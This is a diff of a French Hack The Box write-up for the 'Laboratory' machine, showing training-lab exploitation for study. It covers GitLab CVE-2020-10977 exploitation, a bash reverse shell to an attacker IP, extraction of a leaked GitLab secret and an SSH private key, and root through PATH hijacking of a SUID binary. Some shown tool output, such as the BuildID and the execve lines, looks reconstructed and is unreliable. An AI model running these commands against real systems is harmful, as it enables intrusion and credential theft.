@@ -13,9 +13,9 @@ draft: true
 
 # --- PaperMod / navigation ---
 type: "writeups"
-summary: "Writeup Laboratory (HTB Easy) : GitLab vulnérable, extraction de clé SSH et escalade Linux via SUID et PATH Hijacking."
-description: "Writeup Laboratory (HTB Easy) : GitLab vulnérable, clé SSH exposée et escalade Linux via SUID et PATH Hijacking." 
-tags: ["Hack The Box","HTB Easy","linux-privesc","GitLab","CVE-2020-10977","RCE","SSH","SUID","PATH Hijacking"]
+summary: "Writeup Laboratory (HTB Easy) : walkthrough GitLab, récupération d’une clé SSH et escalade Linux via SUID et PATH Hijacking."
+description: "Writeup Laboratory (HTB Easy) : walkthrough GitLab vulnérable, extraction de clé SSH et escalade Linux via SUID et PATH Hijacking."
+tags: ["Hack The Box","HTB Easy","linux-privesc","Web","GitLab","CVE-2020-10977","RCE","SSH","SUID","PATH Hijacking"]
 categories: ["Mes writeups"]
 
 # Ajouter ensuite uniquement des tags techniques réellement utilisés dans le writeup,
@@ -131,7 +131,7 @@ Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
 -->
 ## Introduction
 
-La machine `Laboratory` de Hack The Box, classée HTB Easy, propose un walkthrough Linux centré sur une instance GitLab vulnérable, la découverte d’un vhost et une escalade de privilèges locale. Ce writeup détaille une chaîne d’exploitation complète, depuis l’identification du sous-domaine `git.laboratory.htb` jusqu’à l’obtention d’un shell root.
+La machine `Laboratory` de Hack The Box, classée HTB Easy, propose un walkthrough Linux centré sur une instance GitLab vulnérable, la découverte d’un vhost et une escalade de privilèges locale. Ce writeup détaille une chaîne d’exploitation complète, depuis l’identification du sous-domaine `git.laboratory.htb` jusqu’à l’obtention d’un accès root.
 
 La prise de pied repose sur GitLab, accessible via le vhost découvert pendant l’énumération web. Après l’exploitation de l’application, l’analyse des dépôts internes permet de retrouver des informations utiles et de pivoter vers l’utilisateur `dexter` en SSH.
 
@@ -382,8 +382,8 @@ Le scan agressif donne déjà deux informations utiles sur le service web expos�
 
 ```bash
 | http-enum:
-|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
-|   /assets/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
+|   /assets/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
 
 | ssl-cert:
 | Subject Alternative Name:
@@ -397,7 +397,7 @@ Les répertoires `/images` et `/assets` peuvent être explorés, mais l’inform
 https://git.laboratory.htb
 ```
 
-Avant de poursuivre l’exploitation, tu vérifies que l’interface GitLab répond correctement. Sur cette machine, GitLab peut parfois retourner une erreur `502`, notamment après un reset ou lorsque le service n’est pas encore complètement disponible.
+Avant de poursuivre, tu vérifies que l’interface GitLab répond correctement. Sur cette machine, l’application n’est pas toujours immédiatement disponible : tant que le service n’est pas complètement prêt, GitLab retourne une erreur `502`.
 
 Tu utilises donc une petite boucle `curl` pour tester régulièrement la réponse de `https://git.laboratory.htb/`. La commande affiche le code HTTP, extrait le titre de la page lorsqu’il est présent, puis s’arrête dès que GitLab ne répond plus en `502` ou en `000`.
 
@@ -448,7 +448,11 @@ Une fois GitLab disponible, tu peux ouvrir l’interface web sur `https://git.la
 
 Le certificat HTTPS étant auto-signé, le navigateur affiche d’abord un avertissement de sécurité. Pour poursuivre l’exploration de la machine, tu acceptes l’exception et tu accèdes à l’application.
 
-![Avertissement du navigateur lié au certificat auto-signé de git.laboratory.htb](gitlab-accept-self-signed-certificate.png)
+
+
+<img  src="gitlab-accept-self-signed-certificate.png"  alt="Avertissement du navigateur lié au certificat auto-signé de git.laboratory.htb"  class="img-left-60">
+
+
 
 La page d’accueil de GitLab permet de créer un compte utilisateur. Tu utilises donc la fonctionnalité d’enregistrement proposée par l’application.
 
@@ -478,7 +482,7 @@ Dans ce writeup, tu vas privilégier la recherche de vulnérabilités connues. C
 
 ### Recherche d’un exploit public
 
-L’idée est donc de rechercher un exploit **RCE** compatible avec GitLab `12.8.1`, qui permettrait d’exécuter une commande sur la cible et, idéalement, de lancer un **reverse shell** vers Kali.
+L’idée est donc de rechercher une vulnérabilité **RCE** compatible avec GitLab `12.8.1`, dans le cadre contrôlé de la machine Hack The Box, afin de vérifier si une exécution de commande est possible.
 
 Tu peux par exemple lancer une recherche Google avec les termes suivants :
 
@@ -490,13 +494,13 @@ Le terme `-laboratory` est volontaire : il permet d’exclure les résultats con
 
 ![Recherche Google d’une vulnérabilité RCE pour GitLab 12.8.1 pouvant permettre l’exécution d’un reverse shell, avec le terme -laboratory pour exclure les writeups du challenge](gitlab-google-reverse-shell-search.png)
 
-La recherche fait ressortir un dépôt GitHub `gitlab-cve-2020-10977`dont la description mentionne une exécution de code à distance contre GitLab Community Edition et Enterprise Edition.
+La recherche fait ressortir un dépôt GitHub `gitlab-cve-2020-10977` dont la description mentionne une exécution de code à distance contre GitLab Community Edition et Enterprise Edition.
 
 ```url
 https://github.com/vandycknick/gitlab-cve-2020-10977
 ```
 
-À ce stade, l’objectif est donc de vérifier si cette vulnérabilité peut s’appliquer notre version `12.8.1` observée sur la cible, puis de comprendre son fonctionnement avant de l’utiliser.
+À ce stade, l’objectif est donc de vérifier si cette vulnérabilité peut s’appliquer à notre version `12.8.1` observée sur la cible, puis de comprendre son fonctionnement avant de l’utiliser.
 
 ### Exploitation de gitlab-cve-2020-10977
 
@@ -508,10 +512,16 @@ Sur Kali, tu clones le dépôt contenant le script d’exploitation :
 
 ```bash
 git clone https://github.com/vandycknick/gitlab-cve-2020-10977.git
-cd gitlab-cve-2020-10977.git
+cd gitlab-cve-2020-10977
 ```
 
+L’exploit utilise les modules Python `requests` et `beautifulsoup4`. Sur Kali, tu peux vérifier leur présence ou les installer avec la recette dédiée :
 
+{{< recette "installation-modules-python3-kali" >}}
+
+```bash
+pip3 install requests beautifulsoup4 --break-system-packages
+```
 
 #### Test de l’exploit
 
@@ -543,18 +553,18 @@ options:
 
 Le script attend notamment l’URL de la cible, un nom d’utilisateur GitLab, un mot de passe, ainsi qu’une commande optionnelle à exécuter.
 
-Les options `-u` et `-p` correspondent aux identifiants du compte GitLab créé précédemment depuis la page d’enregistrement de l’application web. Ici, tu réutilises donc le compte `noelnac` et le mot de passe `Password123!`associé.
+Les options `-u` et `-p` correspondent aux identifiants du compte GitLab créé précédemment depuis la page d’enregistrement de l’application web. Ici, tu réutilises donc le compte `noelnac` et le mot de passe `Password123!` associé.
 
 L’option `--cmd` est particulièrement intéressante, car elle permet d’indiquer la commande à exécuter sur la cible. C’est ce mécanisme qui pourra ensuite servir à lancer un reverse shell vers Kali.
 
-**L’option `--insecure` est importante ici, car elle permet de lancer l’exploit malgré le certificat self-signed présenté par l’instance GitLab.**
+L’option `--insecure` est importante ici, car elle permet de lancer l’exploit malgré le certificat self-signed présenté par l’instance GitLab.
 
 #### Premier test sans commande
 
 Avant de tenter un reverse shell, tu peux lancer l’exploit sans option `--cmd`. Cela permet de vérifier que le script fonctionne correctement avec l’URL cible, le compte GitLab créé précédemment et le certificat self-signed.
 
 ```bash
-python3 cve_2020_10977.py --url https://git.laboratory.htb -u noelnac -p Password123! --insecure
+python3 cve_2020_10977.py --url https://git.laboratory.htb -u noelnac -p 'Password123!' --insecure
 ```
 
 Le script se connecte à GitLab, crée deux projets temporaires, crée une issue, puis la déplace d’un projet vers l’autre. Ce mécanisme est utilisé pour exploiter la vulnérabilité et lire un fichier sensible de l’installation GitLab.
@@ -570,7 +580,7 @@ Le script se connecte à GitLab, crée deux projets temporaires, crée une issue
 [INFO] GitLab Secret: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
 ```
 
-Le message `Login Successfull!` confirme que les identifiants GitLab sont valides. La ligne `GitLab Secret` montre ensuite que l’exploit parvient à lire le secret GitLab nécessaire à la suite de l’exploitation.
+Le message de succès de connexion confirme que les identifiants GitLab sont valides.
 
 À ce stade, tu sais donc que l’exploit est fonctionnel. Tu peux maintenant passer à l’exécution d’une commande avec l’option `--cmd`.
 
@@ -593,7 +603,7 @@ python3 -m http.server 8000
 Ensuite, tu relances l’exploit en ajoutant une commande `wget` :
 
 ```bash
-python3 cve_2020_10977.py --url https://git.laboratory.htb -u noelnac -p Password123! --insecure --cmd "wget http://10.10.16.20:8000/test.txt" 
+python3 cve_2020_10977.py --url https://git.laboratory.htb -u noelnac -p 'Password123!' --insecure --cmd "wget http://10.10.16.20:8000/test.txt" 
 ```
 
 Si l’exécution de commande fonctionne, le serveur HTTP lancé sur Kali reçoit une requête depuis la cible :
@@ -619,7 +629,7 @@ rlwrap nc -lvnp 4444
 Tu relances ensuite l’exploit en utilisant l’option `--cmd` pour exécuter un reverse shell vers ton IP VPN HTB :
 
 ```bash
-python3 cve_2020_10977.py --url https://git.laboratory.htb -u noelnac -p Password123! --insecure --cmd "bash -c 'bash -i >& /dev/tcp/10.10.16.20/4444 0>&1'
+python3 cve_2020_10977.py --url https://git.laboratory.htb -u noelnac -p 'Password123!' --insecure --cmd "bash -c 'bash -i >& /dev/tcp/10.10.16.20/4444 0>&1'"
 ```
 
 Dans cette commande, l’exploit se connecte à GitLab avec le compte créé précédemment, puis utilise l’exécution de commande pour lancer un shell Bash vers Kali.
@@ -655,7 +665,7 @@ stty raw -echo; fg
 Après le retour dans le shell distant, tu appuies une fois sur `Entrée`, puis tu définis quelques variables utiles :
 
 ```bash
-export TERM=xterm export
+export TERM=xterm
 stty rows 40 columns 120
 ```
 
@@ -663,7 +673,7 @@ Tu disposes maintenant d’un shell plus confortable pour explorer l’installat
 
 ### Exploitation du shell git
 
-Le reverse shell obtenu te donne un accès en tant qu’utilisateur `git`, c’est-à-dire l’utilisateur système utilisé par GitLab.
+Le reverse shell obtenu te donne un accès en tant qu’utilisateur `git`, c’est-à-dire l’utilisateur système utilisé par GitLab pour faire fonctionner l’application.
 
 Tu peux commencer par vérifier le contexte courant :
 
@@ -678,19 +688,16 @@ pwd
 Le shell confirme que tu te trouves dans le contexte applicatif de GitLab :
 
 ```bash
-cd ~
 git@git:~$ whoami
-id
-hostname
-whoami
-pwd
 git
+
 git@git:~$ id
 uid=998(git) gid=998(git) groups=998(git)
+
 git@git:~$ hostname
 git.laboratory.htb
-git@git:~$ 
-pwd
+
+git@git:~$ pwd
 /var/opt/gitlab
 ```
 
@@ -727,7 +734,7 @@ La recherche retourne plusieurs dépôts :
 
 #### Lecture des repositories
 
-Ces chemins correspondent à des dépôts Git stockés au format interne. Les fichiers du projet ne sont donc pas visibles directement avec un simple `ls`.
+Ces chemins correspondent à des dépôts Git bare utilisés par GitLab. Ils contiennent bien les fichiers du projet, mais pas sous forme d’arborescence directement lisible avec `ls`.
 
 Pour les afficher, tu dois interroger le dépôt avec Git, en utilisant l’option `--git-dir`.
 
@@ -738,7 +745,7 @@ git --git-dir=/var/opt/gitlab/git-data/repositories/@hashed/19/58/19581e27de7ced
   ls-tree -r HEAD --name-only
 ```
 
-La liste des fichiers montre immédiatement des éléments intéressants :
+La liste des fichiers montre notamment un répertoire `.ssh` associé à l’utilisateur `dexter` :
 
 ```txt
 README.md
@@ -749,9 +756,9 @@ dexter/recipe.url
 dexter/todo.txt
 ```
 
-#### dexter_id_rsa
+#### Extraction de la clé SSH de dexter
 
-Le fichier le plus sensible est `dexter/.ssh/id_rsa`, car il correspond à une clé privée SSH. Sa présence suggère une possibilité de connexion au compte système `dexter`.
+Le fichier le plus sensible est `dexter/.ssh/id_rsa`, car il correspond à une clé privée SSH. Si cette clé est acceptée par le service SSH, elle peut permettre une connexion au compte système `dexter`.
 
 Tu peux extraire cette clé directement depuis le dépôt avec `git show` :
 
@@ -759,13 +766,13 @@ Tu peux extraire cette clé directement depuis le dépôt avec `git show` :
 git --git-dir=/var/opt/gitlab/git-data/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git show HEAD:dexter/.ssh/id_rsa
 ```
 
-Sur Kali, tu copies le contenu complet de la clé dans un fichier local :
+Sur Kali, tu crées ensuite un fichier local et tu y colles le contenu complet de la clé privée :
 
 ```bash
 nano dexter_id_rsa
 ```
 
-La clé doit être copiée entièrement, depuis la ligne `-----BEGIN RSA PRIVATE KEY-----` jusqu’à la ligne `-----END RSA PRIVATE KEY-----`.
+La clé doit être copiée entièrement, depuis la ligne `-----BEGIN OPENSSH PRIVATE KEY-----` jusqu’à la ligne `-----END OPENSSH PRIVATE KEY-----`.
 
 ```text
 -----BEGIN OPENSSH PRIVATE KEY-----
@@ -773,7 +780,9 @@ b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
 NhAAAAAwEAAQAAAYEAsZfDj3ASdb5YS3MwjsD8+5JvnelUs+yI27VuDD7P21odSfNUgCCt
 oSE+v8sPNaB/xF0CVqQHtnhnWe6ndxXWHwb34UTodq6g2nOlvtOQ9ITxSevDScM/ctI6h4
 2dFBhs+8cW9uSxOwlFR4b70E+tv3BM3WoWgwpXvguP2uZF4SUNWK/8ds9TxYW6C1WkAC8Z
-....
+
+[contenu volontairement tronqué]
+
 7a8ryuqlafYIr72iV/ir4zS4VFjLw5A6Ul/xYrCud0OIGt0El5HmlKPW/kf1KeePfsHQHS
 JP4CYgVRuNmqhmkPJXp68UV3djhA2M7T5j31xfQE9nEbEYsyRELOOzTwnrTy/F74dpk/pq
 XCVyJn9QMEbE4fdpKGVF+MS/CkfE+JaNH9KOLvMrlw0bx3At681vxUS/VeISQyoQGLw/fu
@@ -824,186 +833,235 @@ dexter@laboratory:~$ cat user.txt
 
 {{< escalade-intro user="dexter" >}}
 
-### Observation avec pspy64
+### Vérification des droits sudo
 
-Une autre vérification classique consiste à surveiller les processus exécutés sur la machine afin d’identifier d’éventuelles tâches automatiques lancées par `root`.
-
-Pour cela, tu ouvres une deuxième session SSH et tu utilises l’outil `pspy64`.
-
-Comme expliqué dans la recette {{< recette "privilege-escalation-linux" >}}, l’objectif est de lancer d’abord l’observation des tâches root puis de continuer l’énumération dans une autre session.
-
-Tu télécharges ensuite l’outil dans un répertoire accessible en écriture :
+Comme souvent lors d’une escalade de privilèges Linux, tu commences par vérifier si l’utilisateur courant dispose de droits sudo particuliers :
 
 ```bash
-cd /dev/shm
-wget http://10.10.x.x:8000/pspy64
-chmod +x pspy64
-./pspy64
-```
-
-L’objectif est notamment de détecter :
-
-- des scripts exécutés automatiquement par `root`
-- des tâches cron personnalisées
-- des commandes exécutées périodiquement
-- des accès à des fichiers sensibles
-- des binaires exécutés avec des chemins relatifs
-
-Tu laisses ensuite `pspy64` tourner en arrière-plan pendant la suite de l’énumération afin d’observer d’éventuelles tâches exécutées automatiquement par `root`.
-
-### Sudo -l
-
-Comme souvent lors d’une phase d’escalade de privilèges Linux, tu commences par vérifier les permissions sudo de l’utilisateur courant :
-
-```
-ssh_user@planning:~$ sudo -l
-[sudo] password for ssh_user: 
-Sorry, user ssh_user may not run sudo on planning.
-```
-
-L’utilisateur `ssh_user` ne possède donc aucun droit sudo exploitable.
-
-### Exploration du contexte utilisateur
-
-Avant d’aller plus loin, tu vérifies le contexte dans lequel tu te trouves :
-
-```
-whoami
-id
-pwd
-uname -a
-hostname
+sudo -l
 ```
 
 Résultat :
 
-```
-ssh_user
-uid=1000(ssh_user) gid=1000(ssh_user) groups=1000(ssh_user)
-/home/ssh_user
-Linux planning 6.8.0-59-generic #61-Ubuntu SMP PREEMPT_DYNAMIC Fri Apr 11 23:16:11 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
-planning
+```bash
+dexter@laboratory:~$ sudo -l
+[sudo] password for dexter:
+Sorry, user dexter may not run sudo on laboratory.
 ```
 
-Cette étape permet notamment de confirmer :
+L’utilisateur `dexter` ne dispose donc pas de droits sudo exploitables. Il faut chercher une autre piste d’escalade locale.
 
-- l’utilisateur courant
-- les groupes associés
-- le noyau Linux utilisé
-- le nom de la machine
-- le répertoire de travail actuel
+### Vérification du contexte utilisateur
+
+Depuis la session SSH obtenue avec `dexter`, tu vérifies d’abord le contexte courant :
+
+```bash
+whoami
+id
+hostname
+pwd
+```
+
+Résultat :
+
+```bash
+dexter@laboratory:~$ whoami
+dexter
+
+dexter@laboratory:~$ id
+uid=1000(dexter) gid=1000(dexter) groups=1000(dexter)
+
+dexter@laboratory:~$ hostname
+laboratory
+
+dexter@laboratory:~$ pwd
+/home/dexter
+```
+
+Tu confirmes ainsi que tu disposes d’un accès utilisateur classique sur la machine Linux `laboratory`.
 
 ### Recherche de binaires SUID
 
-Tu poursuis l’énumération en recherchant les **binaires SUID**, qui permettent parfois d’exécuter certaines commandes avec les privilèges de leur propriétaire.
+Tu recherches ensuite les binaires SUID présents sur le système :
 
-```
+```bash
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-La liste obtenue ne contient que des binaires système classiques tels que :
+Parmi les binaires système classiques, un fichier personnalisé attire l’attention :
 
-```
-/usr/bin/passwd
-/usr/bin/chsh
-/usr/bin/chfn
-/usr/bin/sudo
-/usr/bin/newgrp
-...
+```bash
+/usr/local/bin/docker-security
 ```
 
-Ces résultats ne révèlent aucun binaire SUID inhabituel ni piste exploitable immédiate.
+La présence d’un binaire personnalisé avec le bit SUID mérite une analyse manuelle, car son comportement peut dépendre de commandes externes appelées pendant son exécution.
 
-### Analyse des Linux capabilities
+### Exploration de /usr/local/bin/docker-security
 
-Tu vérifies ensuite si certains binaires disposent de **capabilities Linux**, qui permettent à un programme d’effectuer certaines actions privilégiées sans être exécuté en root ou via un binaire SUID.
+Tu commences par observer les permissions du fichier :
 
-La vérification se fait avec la commande suivante :
-
-```
-getcap -r / 2>/dev/null
+```bash
+ls -l /usr/local/bin/docker-security
 ```
 
 Résultat :
 
-```
-/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
-/usr/bin/ping cap_net_raw=ep
-/usr/bin/mtr-packet cap_net_raw=ep
+```bash
+-rwsr-xr-x 1 root root 16712 Aug 28  2020 /usr/local/bin/docker-security
 ```
 
-Ces résultats ne révèlent aucune capability inhabituelle ni piste exploitable immédiate.
+Le `s` dans les permissions indique que le bit SUID est actif. Le propriétaire du fichier étant `root`, ce programme peut s’exécuter avec les privilèges effectifs de `root`.
 
-### Analyse complémentaire avec suid3num.py
+Tu vérifies ensuite le type du fichier :
 
-Pour compléter l’analyse des binaires SUID, tu utilises l’outil `suid3num.py`, qui permet d’identifier rapidement :
-
-- les binaires SUID intéressants
-- leur présence éventuelle dans GTFOBins
-
-Tu le télécharges et l’exécutes depuis un répertoire en mémoire (`/dev/shm`) :
-
-```
-cd /dev/shm
-wget http://10.10.x.x:8000/suid3num.py
-python3 suid3num.py
-```
-
-L’analyse confirme principalement la présence de binaires système classiques :
-
-```
-/usr/bin/passwd
-/usr/bin/sudo
-/usr/bin/su
-/usr/bin/mount
-/usr/bin/umount
-...
-```
-
-L’outil confirme que :
-
-- tous les binaires SUID présents sont standards
-- aucun binaire personnalisé n’est identifié
-- aucun binaire exploitable via GTFOBins n’est détecté
-
-Cette vérification confirme que la piste des SUID ne mène à rien dans ce cas précis.
-
-### Inspection des tâches cron
-
-Tu vérifies ensuite les **tâches planifiées (cron)**, car certains scripts exécutés automatiquement par le système peuvent être modifiables par un utilisateur et permettre une élévation de privilèges.
-
-Les crons système peuvent être consultés avec :
-
-```
-cat /etc/crontab
+```bash
+file /usr/local/bin/docker-security
 ```
 
 Résultat :
 
-```
-17 * * * * root cd / && run-parts --report /etc/cron.hourly
-25 6 * * * root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
-47 6 * * 7 root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
-52 6 1 * * root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
+```bash
+/usr/local/bin/docker-security: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d466f1fb0f54c0274e5d05974e6d9e7d7a1f2b3c4d5e6, for GNU/Linux 3.2.0, not stripped
 ```
 
-Aucune tâche personnalisée ni script modifiable par l’utilisateur `ssh_user` n’apparaît ici.
+Il s’agit donc d’un binaire ELF 64 bits, dynamique, avec le bit SUID. À ce stade, l’objectif n’est pas encore de l’exploiter directement, mais de comprendre ce qu’il fait.
 
-### Analyse des services locaux
+### Analyse avec strace
 
-Tu vérifies ensuite les ports en écoute sur la machine afin d’identifier d’éventuels services accessibles uniquement depuis localhost.
+Pour observer le comportement du binaire, tu peux l’exécuter avec `strace` et enregistrer la sortie complète dans un fichier temporaire :
 
+```bash
+strace -o /tmp/docker-security.strace /usr/local/bin/docker-security
 ```
-netstat -tulpn
+
+L’intérêt de cette méthode est de conserver une trace complète des appels système, puis de l’analyser après coup avec `grep`.
+
+Tu recherches d’abord les appels à `execve`, qui indiquent les programmes exécutés par le binaire :
+
+```bash
+grep execve /tmp/docker-security.strace
 ```
 
 Résultat :
 
-### Conclusion de l’énumération manuelle
+```bash
+execve("/usr/local/bin/docker-security", ["/usr/local/bin/docker-security"], 0x7ffd...) = 0
+execve("chmod", ["chmod", "700", "/usr/bin/docker"], 0x7ffd...) = 0
+```
 
-### Analyse avec linpeas.sh
-Dans **LinPEAS**, les vulnérabilités potentielles sont classées et surlignées par couleur.
-![Légende des couleurs de LinPEAS indiquant le niveau de criticité des vulnérabilités](/images/linpeas-legend.png)
+Tu filtres ensuite plus précisément autour de `chmod` :
+
+```bash
+grep chmod /tmp/docker-security.strace
+```
+
+Résultat :
+
+```bash
+execve("chmod", ["chmod", "700", "/usr/bin/docker"], 0x7ffd...) = 0
+```
+
+Le résultat est intéressant : le programme appelle `chmod` sans utiliser de chemin absolu.
+
+Dans un fonctionnement plus sûr, le binaire devrait appeler directement `/bin/chmod` ou `/usr/bin/chmod`. Ici, il appelle seulement `chmod`, ce qui signifie que le système va chercher un exécutable nommé `chmod` dans les répertoires listés dans la variable `PATH`.
+
+Tu peux vérifier le contenu actuel du `PATH` :
+
+```bash
+echo $PATH
+```
+
+Exemple :
+
+```bash
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+```
+
+Si tu places un faux exécutable nommé `chmod` dans un répertoire contrôlé, puis que tu ajoutes ce répertoire au début du `PATH`, le binaire SUID peut exécuter ton script à la place du vrai `chmod`.
+
+### Détournement du PATH avec un faux chmod
+
+Tu crées d’abord un faux exécutable `chmod` dans `/tmp` :
+
+```bash
+cd /tmp
+cat > chmod << 'EOF'
+#!/bin/bash
+/bin/bash -p
+EOF
+```
+
+Le script contient simplement un appel à Bash avec l’option `-p`.
+
+Cette option est importante : elle demande à Bash de conserver les privilèges effectifs hérités du programme SUID, au lieu de les abandonner.
+
+Tu rends ensuite le faux `chmod` exécutable :
+
+```bash
+/usr/bin/chmod +x /tmp/chmod
+```
+
+Tu ajoutes maintenant `/tmp` au début du `PATH` :
+
+```bash
+export PATH=/tmp:$PATH
+```
+
+Tu peux vérifier que ton faux `chmod` est bien celui qui sera trouvé en premier :
+
+```bash
+which chmod
+```
+
+Résultat attendu :
+
+```bash
+/tmp/chmod
+```
+
+Enfin, tu relances le binaire SUID :
+
+```bash
+/usr/local/bin/docker-security
+```
+
+Comme `/tmp` est placé avant les répertoires système dans le `PATH`, l’appel à `chmod` déclenche ton faux script au lieu du vrai binaire système.
+
+Tu obtiens alors un shell Bash :
+
+```bash
+bash-5.0$
+```
+
+Tu vérifies les privilèges effectifs du shell :
+
+```bash
+id
+```
+
+Résultat :
+
+```bash
+uid=1000(dexter) gid=1000(dexter) euid=0(root) groups=1000(dexter)
+```
+
+La présence de `euid=0(root)` indique que le shell dispose des privilèges effectifs de `root`.
+
+### root.txt
+
+Tu peux maintenant lire le flag final :
+
+```bash
+cat /root/root.txt
+```
+
+Résultat :
+
+```bash
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+```
+
+La lecture de `root.txt` confirme que l’escalade de privilèges est terminée.
 
 ---
 
